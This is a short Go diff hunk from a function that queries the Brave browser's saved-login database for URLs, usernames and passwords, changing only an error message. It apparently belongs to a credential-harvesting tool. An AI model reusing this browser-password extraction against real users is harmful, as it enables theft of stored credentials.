@@ -124,7 +124,7 @@ func getBraveCredentials(path string) ([]Credentials, error) {
 	selectStatement := "SELECT origin_url, username_value, password_value FROM logins"
 	rows, err := db.Query(selectStatement)
 	if err != nil {
-		return credentials, errors.New(fmt.Sprintf("%s: %s\n", "[!] Brave Running", err.Error()))
+		return credentials, errors.New(fmt.Sprintf("%s: %s\n", "Brave Running", err.Error()))
 	}
 
 	defer rows.Close()
